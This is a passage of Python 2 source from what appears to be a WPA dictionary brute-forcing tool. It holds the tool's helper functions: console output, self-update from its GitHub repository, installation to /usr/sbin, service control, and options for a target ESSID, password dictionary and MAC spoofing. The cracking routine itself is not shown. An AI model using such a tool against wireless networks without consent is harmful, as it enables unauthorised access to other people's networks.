                       printc (" ",fcolor.SWhite + "Selected ==> " + fcolor.BYellow + str(usr_resp),"")   
                   return usr_resp;
               else:
                   usr_resp=AskQuestion(QuestionText, ReplyText,ReplyType,DefaultReply,DisplayReply)
                   return usr_resp;
    if usr_resp=="":
        if DisplayReply=="1":
            printc (" ",fcolor.SWhite + "Selected ==> " + fcolor.BYellow + str("Nothing"),"")   
        return usr_resp;
    else:
        if DisplayReply=="1":
            printc (" ",fcolor.SWhite + "Selected ==> " + fcolor.BYellow + str(usr_resp),"")   
        return usr_resp;

def printl (DisplayText,ContinueBack,PrevIconCount):
    """
    Function	   : Displaying text on the same line
    Usage of printl:
        DisplayText        - Text to Display
        ContinueBack = "0" - Start DisplayText on beginning of line.
        ContinueBack = "1" - Start from the back of the previous DisplayText
        ContinueBack = "2" - Start DisplayText on beginning of line with Icon,PrevIconCount need to contain value
        PrevIconCount      - Value of last icon count
    Examples       : Lookup DemoOnPrintl() for examples
    """
    icolor=fcolor.BGreen
    bcolor=fcolor.SWhite
    IconDisplay=""
    if ContinueBack=="":
       ContinueBack="0"
    if PrevIconCount=="":
        PrevIconCount="0"
    else:
        PrevIconCount=int(PrevIconCount)+1
    if PrevIconCount>=8:
        PrevIconCount=0
    PrevIconCount=str(PrevIconCount)
    if PrevIconCount=="0":
        IconDisplay="|"
    if PrevIconCount=="1":
        IconDisplay="/"
    if PrevIconCount=="2":
        IconDisplay="-"
    if PrevIconCount=="3":
        IconDisplay="\\"
    if PrevIconCount=="4":
        IconDisplay="|"
    if PrevIconCount=="5":
        IconDisplay="/"
    if PrevIconCount=="6":
        IconDisplay="-"
    if PrevIconCount=="7":
        IconDisplay="\\"
    if ContinueBack=="0":
        curses.setupterm()
        TWidth=curses.tigetnum('cols')
        TWidth=TWidth-1
        sys.stdout.write("\r")
        sys.stdout.flush()
        sys.stdout.write (" " * TWidth + "\r")
        sys.stdout.flush()
        sys.stdout.write(DisplayText)
        sys.stdout.flush()
    if ContinueBack=="1":
        sys.stdout.write(DisplayText)
        sys.stdout.flush()
    if ContinueBack=="2":
        curses.setupterm()
        TWidth=curses.tigetnum('cols')
        TWidth=TWidth-1
        sys.stdout.write("\r")
        sys.stdout.flush()
        sys.stdout.write (" " * TWidth + "\r")
        sys.stdout.flush()
        sys.stdout.write(bcolor + "[" + icolor + str(IconDisplay) + bcolor + "]  " + DisplayText)
        sys.stdout.flush()
    return str(PrevIconCount);

def DrawLine(LineChr,LineColor,LineCount):
    """
    Function	     : Drawing of Line with various character type, color and count
    Usage of DrawLine:
        LineChr      - Character to use as line
        LineColor    - Color of the line
        LineCount    - Number of character to print. "" is print from one end to another
    Examples         : Lookup DemoDrawLine for examples
    """
 
    printd(fcolor.CDebugB + "DrawLine Function\n" + fcolor.CDebug + "       LineChr - " + str(LineChr) + "\n       " + "LineColor = " + str(LineColor) + "\n       " + "LineCount = " + str(LineCount))
    if LineColor=="":
        LineColor=fcolor.SBlack
    if LineChr=="":
        LineChr="_"
    if LineCount=="":
        curses.setupterm()
        TWidth=curses.tigetnum('cols')
        TWidth=TWidth-1
    else:
        TWidth=LineCount
    print LineColor + LineChr * TWidth


def MoveInstallationFiles(srcPath,dstPath):
    import shutil
    listOfFiles = os.listdir(srcPath)
    listOfFiles.sort()
    for f in listOfFiles:
        if f!=".git" and f!=".gitignore":
            srcfile = srcPath + f
            dstfile = dstPath + f
            if f==ScriptName:
                shutil.copy2(srcfile, "/usr/sbin/" + str(ScriptName))
                printd("Copy to " + "/usr/sbin/" + str(ScriptName))
                result=os.system("chmod +x /usr/sbin/" + ScriptName + " > /dev/null 2>&1")
                printd("chmod +x " + "/usr/sbin/" + str(ScriptName))
            if os.path.exists(dstfile):
                os.remove(dstfile)
            shutil.move(srcfile, dstfile)
            print fcolor.SGreen + "        Moving " + fcolor.CUnderline + f + fcolor.CReset + fcolor.SGreen + " to " + dstfile
            if f==ScriptName:
                result=os.system("chmod +x " + dstfile + " > /dev/null 2>&1")
                printd("chmod +x " + str(dstfile))

def GetScriptVersion(cmdScriptName):
    if cmdScriptName=="":
        cmdScriptName=str(os.path.realpath(os.path.dirname(sys.argv[0]))) + "/" + str(os.path.basename(__file__))

    VerStr=""
    findstr="appver=\""
    printd ("Get Version : " + cmdScriptName)
    if os.path.exists(cmdScriptName)==True:
        ps=subprocess.Popen("cat " + cmdScriptName + " | grep '" + findstr + "' | sed -n '1p'" , shell=True, stdout=subprocess.PIPE)	
        VerStr=ps.stdout.read()
        VerStr=VerStr.replace("appver=\"","")
        VerStr=VerStr.replace("\"","")
        VerStr=VerStr.replace("\n","")
        return VerStr;

def GetUpdate(ExitMode):
    if ExitMode=="":
        ExitMode="1"

    github="https://github.com/SYWorks/wpa-bruteforcer.git"
    Updatetmpdir="/tmp/git-update/"
    DownloadedScriptLocation=Updatetmpdir + ScriptName
    dstPath=os.getcwd() + "/"
    dstPath=appdir
    dstScript=dstPath + ScriptName

    CurVersion=GetScriptVersion(dstScript)
    printc (".","Retrieving update details ....","")
    result=RemoveTree(Updatetmpdir,"")
    result=os.system("git clone " + github + " " + Updatetmpdir + " > /dev/null 2>&1")
    if result==0:
        printc (" ",fcolor.SGreen + "Package downloaded..","")
        NewVersion=GetScriptVersion(DownloadedScriptLocation)
        if CurVersion!=NewVersion:
            printc ("i","Current Version\t: " + fcolor.BRed + str(CurVersion),"")
            printc ("  ",fcolor.BWhite + "New Version\t: " + fcolor.BRed + str(NewVersion),"")
            Ask=AskQuestion ("Do you want to update ?","Y/n","","Y","")
            if Ask=="y" or Ask=="Y" or Ask=="":
                srcPath=Updatetmpdir
                result=MoveInstallationFiles(srcPath,dstPath)
                result=os.system("chmod +x " + dstScript + " > /dev/null 2>&1")
                result=RemoveTree(Updatetmpdir,"")
                print ""
                printc ("i",fcolor.BGreen + "Application updated !!","")
                printc ("  ",fcolor.SGreen + "Re-run the updated application on [ " + fcolor.BYellow + dstScript + fcolor.SGreen + " ]..","")
                if ExitMode=="1":
                    exit(0)
                else:
                    return
            else:
                printc ("i",fcolor.BWhite + "Update aborted..","")
                result=RemoveTree(Updatetmpdir,"")
        else:
            printc ("i","Your already have the latest version [ " + fcolor.BRed + str(CurVersion) + fcolor.BWhite + " ].","")
            printc ("  ",fcolor.BWhite + "Update aborted..","")
            result=RemoveTree(Updatetmpdir,"")
            if ExitMode=="1":
                exit(0)
            else:
                return
    else:
        printd ("Unknown Error : " + str(result))
        printc ("!!!","Unable to retrieve update !!","")
        if ExitMode=="1":
            exit(1)
        else:
            return

def Run(cmdRun,Suppress):
    if Suppress=="":
        Suppress="1"
    rtncode=-1
    cmdExt=""
    if cmdRun=="":
        return rtncode;
    if cmdRun.find(">")!=-1 or cmdRun.find(">>")!=-1:
        Suppress="0"

    if Suppress=="1":
        cmdExt=" > /dev/null 2>&1"
    ps=Popen(str(cmdRun) + str(cmdExt), shell=True, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)
    pid=ps.pid 
    readout=ps.stdout.read()
    return str(readout)


def TimerApp(cmdLine,DelaySeconds,ShowDisplay):
    import os
    returncode=-1
    if ShowDisplay=="":
        ShowDisplay="0"

    if DelaySeconds=="":
        DelaySeconds=5
    if cmdLine!="":
        if ShowDisplay=="1":
            printc (" ",fcolor.SGreen + "Running command line [ " + fcolor.SRed + cmdLine + fcolor.SGreen + " ] ....","")
        ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE, preexec_fn=os.setsid)	
        pid=ps.pid
        if ShowDisplay=="1":
            printc (" ",fcolor.SGreen + "PID : " + fcolor.SRed + str(pid) + fcolor.SGreen + "","")
            printc (" ",fcolor.SGreen + "Delay for [ " + fcolor.SRed + str(DelaySeconds) + fcolor.SGreen + " ] seconds ....","")
        time.sleep(DelaySeconds)
        if ShowDisplay=="1":
            printc (" ",fcolor.SGreen + "Killing PID [ " + fcolor.SRed + str(pid) + fcolor.SGreen + " ] ....","")
        os.killpg(pid, signal.SIGTERM)
        returncode = ps.wait()
        if ShowDisplay=="1":
            printc (" ",fcolor.SGreen + "Returncode of subprocess [ " + fcolor.SRed + str(returncode) + fcolor.SGreen + " ] ....","")
    return returncode;

def GetDir(LookupPath):
    """
        Function   : Return the varius paths such as application path, current path and Temporary path
        Example    : 
    """
    import os
    import tempfile
    pathname, scriptname = os.path.split(sys.argv[0])

    if LookupPath=="":
        LookupPath="appdir"
    LookupPath=LookupPath.lower()

    if LookupPath=="curdir":
        result=os.getcwd()
    if LookupPath=="appdir":
       result=os.path.realpath(os.path.dirname(sys.argv[0]))
    if LookupPath=="exedir":
        result=os.path.dirname(sys.executable)
    if LookupPath=="relativedir":
        result=pathname
    if LookupPath=="scriptdir":
        result=os.path.abspath(pathname)
    if LookupPath=="sysdir":
        result=sys.path[0]
    if LookupPath=="pypath":
        result=sys.path[1]
    if LookupPath=="homedir":
        result=os.environ['HOME']
    if LookupPath=="tmpdir":
        result=tempfile.gettempdir()
    if LookupPath=="userset":
        result=appdir
    result=result + "/"

    if result[-2:]=="//":
        result=result[:len(str(result))-1]
    return result;

def CheckLinux():
    """
        Function : Check for Current OS. Exit if not using Linux
    """
    from subprocess import call
    from platform import system
    os = system()
    printd ("Operating System : " + os)
    if os != 'Linux':
        printc ("!!!","This application only works on Linux.","")
        exit(1)


def CheckPyVersion(MinPyVersion):
    """
        Function : Check for current Python Version. 
                   Exit if current version is less than MinPyVersion
    """

    import platform
    PyVersion = platform.python_version()
    printd ("Python Version : " + PyVersion)
    if MinPyVersion!="":
        if MinPyVersion >= PyVersion:
            printc ("!!!",fcolor.BGreen + "Your Python version " + fcolor.BRed + str(PyVersion) + fcolor.BGreen + " may be outdated.","")
            printc ("  ",fcolor.BWhite + "Minimum version required for this application is " + fcolor.BRed + str(MinPyVersion) + fcolor.BWhite + ".","")
            exit(0)

def GetAppName():
    """
        Function : Get Current Script Name
        Return   : ScriptName  = Actual script name
                   DScriptName = For Display
    """

    global ScriptName
    global FullScriptName
    global DScriptName
    ScriptName=os.path.basename(__file__)
    DScriptName="./" + ScriptName
    appdir=os.path.realpath(os.path.dirname(sys.argv[0]))
    FullScriptName=str(appdir) + "/" + str(ScriptName)
    printd("FullScriptName : " + FullScriptName)
    printd("ScriptName : " + str(ScriptName))


def DisplayAppDetail():
    print fcolor.SBlue + "   $$$$$  $  $$  $       $$  $$$$$   $$$$$   $$   $   $$$$$" + fcolor.SYellow + "   / \\"
    print fcolor.SBlue + "  $       $  $$  $   $   $$ $    $$  $   $$  $$  $$  $    " + fcolor.SYellow + "   ( R )"
    print fcolor.SBlue + "   $$$$   $$$$   $   $$  $  $    $$  $$$$$   $$$$     $$$$" + fcolor.SYellow + "    \\_/"
    print fcolor.SBlue + "       $   $$     $ $ $ $$  $    $$  $ $$    $ $$        $$"
    print fcolor.SBlue + "       $  $$      $ $ $$$   $$   $$  $  $$   $  $$        $"
    print fcolor.SBlue + "  $$$$$  $$       $$  $$     $$$$$   $   $$  $   $$  $$$$$ "
    print ""
    print fcolor.BGreen + apptitle + " " + appver + fcolor.SGreen + " " + appDesc
    print fcolor.CReset + fcolor.White + appnote
    print ""


def DisplayDisclaimer():
    printc ("!!!","Legal Disclaimer :- " + fcolor.Red + "FOR EDUCATIONAL PURPOSES ONLY !!","")
    print fcolor.SWhite + "     Usage of this application for attacking target without prior mutual consent is illegal. It is the"
    print fcolor.SWhite + "     end user's responsibility to obey all applicable local, state and  federal laws. Author assume no"
    print fcolor.SWhite + "     liability and are not responsible for any misuse or damage caused by this application."
    print ""

def DisplayDetailHelp():
    print fcolor.BGreen + "Usage   : " + fcolor.BYellow + "" + DScriptName + fcolor.BWhite + " [options] " + fcolor.BBlue + "<args>"
    print fcolor.CReset + fcolor.Black + "          Running application without parameter will fire up the interactive mode."
    print ""
    print fcolor.BIPink + "Options:" + fcolor.CReset
    print fcolor.BWhite + "    -h  --help\t\t" + fcolor.CReset + fcolor.White + "- Show basic help message and exit"
    print fcolor.BWhite + "    -hh \t\t" + fcolor.CReset + fcolor.White + "- Show advanced help message and exit"
    print fcolor.BWhite + "        --update\t" + fcolor.CReset + fcolor.White + "- Check for updates"
    print fcolor.BWhite + "        --remove\t" + fcolor.CReset + fcolor.White + "- Uninstall application"
    print fcolor.BWhite + "        --tutorial1\t" + fcolor.CReset + fcolor.White + "- Tutorial on how to operate new scan"
    print fcolor.BWhite + "        --tutorial2\t" + fcolor.CReset + fcolor.White + "- Tutorial on how to continue previous scan"
    print ""
    print fcolor.BWhite + "    -m  --mac" + fcolor.BBlue + " <arg>\t" + fcolor.CReset + fcolor.White + "- Spoof specified MAC Address"
    print fcolor.BWhite + "        --spoof\t\t" + fcolor.CReset + fcolor.White + "- Spoof selected interface with random MAC Address"

    print ""
    print fcolor.BWhite + "    -i  --iface" + fcolor.BBlue + " <arg>\t" + fcolor.CReset + fcolor.White + "- Set Interface to use"
    print fcolor.BWhite + "    -e  --essid" + fcolor.BBlue + " <arg>\t" + fcolor.CReset + fcolor.White + "- Set ESSID (Access Point) to use"
    print fcolor.BWhite + "    -d  --dict" + fcolor.BBlue + " <arg>\t" + fcolor.CReset + fcolor.White + "- Specify the location of dictionary to use"
    print fcolor.BWhite + "    -t  --timeout" + fcolor.BBlue + " <arg>\t" + fcolor.CReset + fcolor.White + "- Set the timeout duration"

    print ""
    print fcolor.BGreen + "Examples: " + fcolor.BYellow + "" + DScriptName + fcolor.BWhite + " --update"
    print fcolor.BGreen + "          " + fcolor.BYellow + "" + DScriptName + fcolor.BWhite + " -i " + fcolor.BBlue + "wlan0" + fcolor.BWhite + " -t " + fcolor.BBlue + "15"+ fcolor.BWhite + " -e " + fcolor.BBlue + "\"ESSID\""
    print fcolor.BGreen + "          " + fcolor.BYellow + "" + DScriptName + fcolor.BWhite + " --iface " + fcolor.BBlue + "wlan1" + fcolor.BWhite + " --timeout " + fcolor.BBlue + "20"+ fcolor.BWhite + " --essid " + fcolor.BBlue + "\"SYWorks\""
    print fcolor.BGreen + "          " + fcolor.BYellow + "" + DScriptName + fcolor.BWhite + " --dict " + fcolor.BBlue + "/Dictionaries/passwords.lst"+ fcolor.BWhite + " --spoof "
    print fcolor.BGreen + "          " + fcolor.BYellow + "" + DScriptName + fcolor.BWhite + " --mac " + fcolor.BBlue + "00:01:02:03:04:05"
    print ""
    DrawLine("-",fcolor.CReset + fcolor.Black,"")
    print ""

def DisplayHelp():
    print fcolor.BGreen + "Usage   : " + fcolor.BYellow + "" + DScriptName + fcolor.BWhite + " [options] " + fcolor.BBlue + "<args>"
    print fcolor.CReset + fcolor.Black + "          Running application without parameter will fire up the interactive mode."
    print ""
    print fcolor.BIPink + "Options:" + fcolor.CReset
    print fcolor.BWhite + "    -h  --help\t\t" + fcolor.CReset + fcolor.White + "- Show basic help message and exit"
    print fcolor.BWhite + "    -hh \t\t" + fcolor.CReset + fcolor.White + "- Show advanced help message and exit"
    print ""
    print fcolor.BWhite + "    -i  --iface" + fcolor.BBlue + " <arg>\t" + fcolor.CReset + fcolor.White + "- Set Interface to use"
    print fcolor.BWhite + "    -e  --essid" + fcolor.BBlue + " <arg>\t" + fcolor.CReset + fcolor.White + "- Set ESSID (Access Point) to use"
    print fcolor.BWhite + "    -d  --dict" + fcolor.BBlue + " <arg>\t" + fcolor.CReset + fcolor.White + "- Specify the location of dictionary to use"
    print fcolor.BWhite + "    -t  --timeout" + fcolor.BBlue + " <arg>\t" + fcolor.CReset + fcolor.White + "- Set the timeout duration"
    print ""
    print fcolor.BGreen + "Examples: " + fcolor.BYellow + "" + DScriptName + fcolor.BWhite + " --update"
    print fcolor.BGreen + "          " + fcolor.BYellow + "" + DScriptName + fcolor.BWhite + " -i " + fcolor.BBlue + "wlan0" + fcolor.BWhite + " -t " + fcolor.BBlue + "15"+ fcolor.BWhite + " -e " + fcolor.BBlue + "\"ESSID\""
    print fcolor.BGreen + "          " + fcolor.BYellow + "" + DScriptName + fcolor.BWhite + " --iface " + fcolor.BBlue + "wlan1" + fcolor.BWhite + " --timeout " + fcolor.BBlue + "20"+ fcolor.BWhite + " --essid " + fcolor.BBlue + "\"SYWorks\""
    print ""
    DrawLine("-",fcolor.CReset + fcolor.Black,"")
    print ""

def GetParameter(cmdDisplay):
    """
   cmdDisplay = "0" : Does not display help if not specified
                "1" : Display help even not specified
                "2" : Display Help, exit if error
    """
    global DebugMode
    global AllArguments
    global SELECTED_IFACE
    SELECTED_IFACE=""
    global SELECTED_ESSID
    SELECTED_ESSID=""
    global TIMEOUT
    TIMEOUT=""
    global SELECTED_DICT
    SELECTED_DICT=""
    global ASSIGNED_MAC
    ASSIGNED_MAC=""
    global SPOOF_MAC
    SPOOF_MAC=""

    AllArguments=""
    
    import sys, getopt
    if cmdDisplay=="":
        cmdDisplay="0"
    Err=0
    totalarg=len(sys.argv)
    printd ("Argument Len    : " + str(totalarg))
    printd ("Argument String : " + str(sys.argv))
    if totalarg>1:
        i=1
        while i < totalarg:
            Err=""
            if i>0:
                i2=i+1
                if i2 >= len(sys.argv):
                   i2=i
                   i2str=""
                else:
                   i2str=str(sys.argv[i2])
                argstr=("Argument %d : %s" % (i, str(sys.argv[i])))
                printd (argstr) 
                arg=str(sys.argv[i])
                if arg=="-h" or arg=="--help":
                    DisplayHelp()
                    Err=0
                    exit()
                    break;
                elif arg=="-hh":
                    DisplayDetailHelp()
                    Err=0
                    exit()
                elif arg=="--update":
                    Err=0
                    GetUpdate("1")
                    exit()
                elif arg=="--remove":
                    Err=0
                    UninstallApplication()
                    exit()
                elif arg=="--tutorial1":
                    Err=0
                    ShowTutorial1()
                    exit()
                elif arg=="--tutorial2":
                    Err=0
                    ShowTutorial2()
                    exit()

                elif arg=="-v" or arg=="--verbose":
                    AllArguments=AllArguments + fcolor.BWhite + "Verbose Mode\t\t:  " + fcolor.BRed + "Enabled\n"
                    DebugMode="1"
                    Err=0
                elif arg=="--spoof":
                    AllArguments=AllArguments + fcolor.BWhite + "Spoof MAC\t\t:  " + fcolor.BRed + "Enabled\n"
                    SPOOF_MAC="1"
                    Err=0
                elif arg=="-e" or arg=="--essid":
                    i=i2
                    if i2str=="":
                        printc("!!!","Invalid ESSID variable set !","")  
                        Err=1
                    else:
                        Err=0
                        if i2str[:1]!="-":
                            SELECTED_ESSID="\"" + i2str + "\"" 
                            AllArguments=AllArguments + fcolor.BWhite + "Selected ESSID\t\t:  " + fcolor.BRed + i2str + "\n"
                        else:
                            printc("!!!","Invalid ESSID variable set [ " + fcolor.BWhite + i2str + fcolor.BRed + " ] !","")  
                            Err=1
                elif arg=="-m" or arg=="--mac":
                    i=i2
                    if i2str=="":
                        printc("!!!","Invalid MAC Address set !","")  
                        Err=1
                    else:
                        Err=0
                        if i2str[:1]!="-":
                            if len(i2str)==17:
                                Result=CheckMAC(i2str)
                                if Result!="":
                                    ASSIGNED_MAC=i2str 
                                    AllArguments=AllArguments + fcolor.BWhite + "Selected MAC\t\t:  " + fcolor.BRed + i2str + "\n"
                                    SPOOF_MAC="1"
                                else:
                                    printc("!!!","Invalid MAC Address set [ " + fcolor.BWhite + i2str + fcolor.BRed + " ] !","")  
                                    Err=1
                            else:
                                printc("!!!","Invalid MAC Address set [ " + fcolor.BWhite + i2str + fcolor.BRed + " ] !","")  
                                Err=1
                        else:
                            printc("!!!","Invalid MAC Address set [ " + fcolor.BWhite + i2str + fcolor.BRed + " ] !","")  
                            Err=1
                elif arg=="-d" or arg=="--dict":
                    i=i2
                    if i2str=="":
                        printc("!!!","Invalid dictionary variable set !","")  
                        Err=1
                    else:
                        Err=0
                        if i2str[:1]!="-":
                            if os.path.isfile(i2str)==True:
                                SELECTED_DICT=i2str
                                AllArguments=AllArguments + fcolor.BWhite + "Dictionary Use\t\t:  " + fcolor.BRed + i2str + "\n"
                            else:
                                printc("!!!","Dictionary specified [ " + fcolor.BWhite + i2str + fcolor.BRed + " ] not found !","")  
                                Err=1
                        else:
                            printc("!!!","Invalid dictionary variable set [ " + fcolor.BWhite + i2str + fcolor.BRed + " ] !","")  
                            Err=1
                elif arg=="-t" or arg=="--timeout":
                    i=i2
                    if i2str=="":
                        printc("!!!","Invalid timeout variable set !","")  
                        Err=1
                    else:
                        Err=0
                        if i2str[:1]!="-":
                            if i2str.isdigit():
                                TIMEOUT=i2str
                                AllArguments=AllArguments + fcolor.BWhite + "Timeout (Seconds)\t:  " + fcolor.BRed + i2str + "\n"
                            else:
                                printc("!!!","Invalid timeout variable set [ " + fcolor.BWhite + i2str + fcolor.BRed + " ] !","")  
                                Err=1
                        else:
                            printc("!!!","Invalid timeout variable set [ " + fcolor.BWhite + i2str + fcolor.BRed + " ] !","")  
                            Err=1



                elif arg=="-i" or arg=="--iface":
                    i=i2
                    if i2str=="":
                        printc("!!!","Invalid Interface variable set !","")  
                        Err=1
                    else:
                        Err=0
                        if i2str[:1]!="-":
                            SELECTED_IFACE=i2str
                            AllArguments=AllArguments + fcolor.BWhite + "Selected interface\t:  " + fcolor.BRed + i2str + "\n"
                        else:
                            printc("!!!","Invalid Interface variable set [ " + fcolor.BWhite + i2str + fcolor.BRed + " ] !","")  
                            Err=1
                elif arg=="-u" or arg=="--url":
                    i=i2
                    if i2str=="":
                        printc("!!!","Invalid URL variable set !","")  
                        Err=1
                    else:
                        Err=0
                        if i2str[:1]!="-":
                            AllArguments=AllArguments + fcolor.BWhite + "Selected URL\t\t:  " + fcolor.BRed + i2str + "\n"
                        else:
                            printc("!!!","Invalid URL variable set !","")  
                            Err=1
                elif Err=="":
                        DisplayHelp()
                        printc("!!!","Invalid option set ! [ " + fcolor.BGreen + arg + fcolor.BRed + " ]","")
                        Err=1
                        exit(0)
                if Err==1:
                    if cmdDisplay=="2":
                        print ""
                        DisplayHelp()
                        exit(0)
                i=i+1
        if AllArguments!="":
            print ""
            print fcolor.BYellow + "Parameter set:"
            print AllArguments
        else:
            print ""
            DisplayHelp()
        print ""
        printc ("i", fcolor.BCyan + "Entering Semi-Interactive Mode..","")
        result=DisplayTimeStamp("start","")
        print ""

    else:
        if cmdDisplay=="1":
            DisplayHelp()
        if cmdDisplay=="2":
            DisplayHelp()
            exit(0)
        else:
            printc ("i", fcolor.BCyan + "Entering Interactive Mode..","")
            result=DisplayTimeStamp("start","")
            print ""


def CheckMAC(MACAddr):
    import string
    result=""
    allchars = "".join(chr(a) for a in range(256))
    delchars = set(allchars) - set(string.hexdigits)
    mac = MACAddr.translate("".join(allchars),"".join(delchars))
    if len(mac) != 12:
        print "mac result = " + str(result)
        return result;
    else:
        result=MACAddr.upper()
    print "mac result = " + str(result)
    return result;

def CheckAppLocation():
    import shutil
    cpath=0
    if os.path.exists(appdir)==True:
        printd ("[" + appdir + "] exist..")
    else:
        printd ("[" + appdir + "] does not exist..")
        result=MakeTree(appdir,"")
        cpath=1
    curdir=os.getcwd() + "/"
    printd ("Current Path : " + str(curdir))
    CurFileLocation=curdir + ScriptName
    AppFileLocation=appdir + ScriptName
    printd("Current File : " + str(CurFileLocation))
    printd("Designated File : " + str(AppFileLocation))
    if os.path.exists(AppFileLocation)==False:
        printd("File Not found in " + str(AppFileLocation))
        printd("Copy file from [" + str(CurFileLocation) + "] to [" + str(AppFileLocation) + " ]")
        shutil.copy2(CurFileLocation, AppFileLocation)
        result=os.system("chmod +x " + AppFileLocation + " > /dev/null 2>&1")
    if os.path.exists("/usr/sbin/" + ScriptName)==False:
        printd("File Not found in " + "/usr/sbin/" + str(ScriptName))
        printd("Copy file from [" + str(CurFileLocation) + "] to [" + "/usr/sbin/" + str(ScriptName) + " ]")
        shutil.copy2(CurFileLocation, "/usr/sbin/" + str(ScriptName))
        result=os.system("chmod +x " + "/usr/sbin/" + str(ScriptName) + " > /dev/null 2>&1")
    if PathList!="":
        printd("PathList : " + str(PathList))
        for path in PathList:
            newPath=appdir + path
            printd("Checking : " + str(newPath))
            if os.path.exists(newPath)==False:
                printd("Path [ " + str(newPath) + " ] not found.")
                cpath=1
                result=MakeTree(newPath,"")
    if cpath==1:
        print ""
def ServiceCheck(SvrName,DisplaySvrName, cmdPrompt,cmdDisplay):
    """
        SvrName          = Actual service name
        DisplaySvrName   = Service name to display
        cmdPrompt   QEID = Question - Enable if disabled
                    AEID = Automatic - Enable if disabled
                    QDIE = Question - Disable if enabled
                    ADIE = Automatic - Disable if enabled
                    DS   = Display Status
        cmdDisplay  "0"  = Don't Display
                    "1"  = Display
    """
    cmdPrompt=cmdPrompt.upper()
    lblColor=fcolor.CReset + fcolor.SGreen
    txtColor=fcolor.CReset + fcolor.BYellow

    if SvrName!="":
        if cmdDisplay=="1" and cmdPrompt!="DS":
            printc("i",lblColor + "Checking on " + txtColor + DisplaySvrName + lblColor + " Service..","")

        SvrResult=ServiceCall(SvrName)
        if cmdDisplay=="1" and cmdPrompt!="DS":
            if SvrResult!="Unrecognised":
                printc("  ",txtColor + DisplaySvrName + lblColor + " is " + fcolor.SRed + str(SvrResult),"")
            else:
                printc("!!!","" + txtColor + DisplaySvrName + fcolor.BRed + " Service not found !","")
                return
        if cmdPrompt=="DS":
            if SvrResult=="Disabled":
                printc("i",txtColor + DisplaySvrName + lblColor + " is " + fcolor.BRed + str(SvrResult),"")
                return
            if SvrResult=="Enabled":
                printc("i",txtColor + DisplaySvrName + lblColor + " is " + fcolor.BGreen + str(SvrResult),"")
                return
            else:
                printc("!!!","" + txtColor + DisplaySvrName + fcolor.BRed + " Service not found !","")
                return
                 
                return
        if SvrResult=="Disabled":
            if cmdPrompt=="QEID":
                Ask=AskQuestion(DisplaySvrName + " is disabled. Enabled ?","Y/n","","Y","")
                if Ask=="y" or Ask=="Y" or Ask=="":
                    result=os.system("service " + SvrName + " start > /dev/null 2>&1")
                    if cmdDisplay=="1":
                        if result==0:
                            printc ("  ",fcolor.SGreen + DisplaySvrName + " enabled..","")
                        else:
                            printc ("  ",fcolor.SRed + DisplaySvrName + " failed to start..","")
            if cmdPrompt=="AEID":
                if cmdDisplay=="1":
                    printc ("  ",lblColor + "Enabling " + DisplaySvrName + "...","")
                result=os.system("service " + SvrName + " start > /dev/null 2>&1")
                if cmdDisplay=="1":
                    if result==0:
                        printc ("  ",fcolor.SGreen + DisplaySvrName + " enabled..","")
                    else:
                        printc ("  ",fcolor.SRed + DisplaySvrName + " failed to start..","")
        if SvrResult=="Enabled":
            if cmdPrompt=="QDIE":
                Ask=AskQuestion(DisplaySvrName + " is enabled. Disable ?","Y/n","","Y","")
                if Ask=="y" or Ask=="Y" or Ask=="":
                    result=os.system("service " + SvrName + " stop > /dev/null 2>&1")
                    if cmdDisplay=="1":
                        if result==0:
                            printc ("  ",fcolor.SGreen + DisplaySvrName + " disabled..","")
                        else:
                            printc ("  ",fcolor.SRed + DisplaySvrName + " failed to stop..","")
            if cmdPrompt=="ADIE":
                if cmdDisplay=="1":
                    printc ("  ",lblColor + "Disabling " + DisplaySvrName + "...","")
                result=os.system("service " + SvrName + " stop > /dev/null 2>&1")
                if cmdDisplay=="1":
                    if result==0:
                        printc ("  ",fcolor.SGreen + DisplaySvrName + " disabled..","")
                    else:
                        printc ("  ",fcolor.SRed + DisplaySvrName + " failed to stop..","")


def ServiceCall(SvrName):
    result=os.system("service " + SvrName + " status > /dev/null 2>&1")
    if result==0:
        CStatus="Enabled"
    if result==768:
        CStatus="Disabled"
    if result==256:
        CStatus="Unrecognised"
    return CStatus;

                   
def DisplayTimeStamp(cmdDisplayType,cmdTimeFormat):
    global TimeStart
    global TimeStop
    global DTimeStart
    global DTimeStop
    lblColor=fcolor.BGreen
    txtColor=fcolor.SGreen

    cmdDisplayType=cmdDisplayType.lower()
    if cmdTimeFormat=="":
        timefmt="%Y-%m-%d %H:%M:%S"
    else:
         timefmt=cmdTimeFormat

    if cmdDisplayType=="start":
        TimeStop=""
        DTimeStop=""
        DTimeStart=time.strftime(timefmt)
        printc ("  ",lblColor + "Started\t: " + txtColor + str(DTimeStart),"")
        TimeStart=datetime.datetime.now()
        return DTimeStart;
    if cmdDisplayType=="start-h":
        TimeStop=""
        DTimeStop=""
        DTimeStart=time.strftime(timefmt)
        TimeStart=datetime.datetime.now()
        return DTimeStart;
    if cmdDisplayType=="stop":
        DTimeStop=time.strftime(timefmt)
        printc ("  ",lblColor + "Stopped\t: " + txtColor + str(DTimeStop),"")
        TimeStop=datetime.datetime.now()
        return DTimeStop;
    if cmdDisplayType=="stop-h":
        DTimeStop=time.strftime(timefmt)
        TimeStop=datetime.datetime.now()
        return DTimeStop;
    if TimeStart!="":
        if cmdDisplayType=="summary" or cmdDisplayType=="summary-a":
            if TimeStop=="":
                TimeStop=datetime.datetime.now()
                DTimeStop=time.strftime(timefmt)
            ElapsedTime = TimeStop - TimeStart
	    ElapsedTime=str(ElapsedTime)
	    ElapsedTime=ElapsedTime[:-4]
            if cmdDisplayType=="summary-a":
                printc ("  ",lblColor + "Started\t: " + txtColor + str(DTimeStart),"")
                printc ("  ",lblColor + "Stopped\t: " + txtColor + str(DTimeStop),"")
	        printc ("  ",lblColor + "Time Spent\t: " + fcolor.BRed + str(ElapsedTime),"")
            if cmdDisplayType=="summary":
	        printc ("  ",lblColor + "Time Spent\t: " + fcolor.BRed + str(ElapsedTime),"")
        return ElapsedTime;
         
class GracefulInterruptHandler(object):
    def __init__(self, sig=signal.SIGINT):
        self.sig = sig
    def __enter__(self):
        self.interrupted = False
        self.released = False
        self.original_handler = signal.getsignal(self.sig)
        def handler(signum, frame):
            self.release()
            self.interrupted = True
        signal.signal(self.sig, handler)
        return self
    def __exit__(self, type, value, tb):
        self.release()
    def release(self):
        if self.released:
            return False
        signal.signal(self.sig, self.original_handler)
        self.released = True
        return True

def printd(ptext):
    if DebugMode=="1":
        print fcolor.CDebugB  + "[DBG]  " + fcolor.CDebug + ptext  + fcolor.CReset
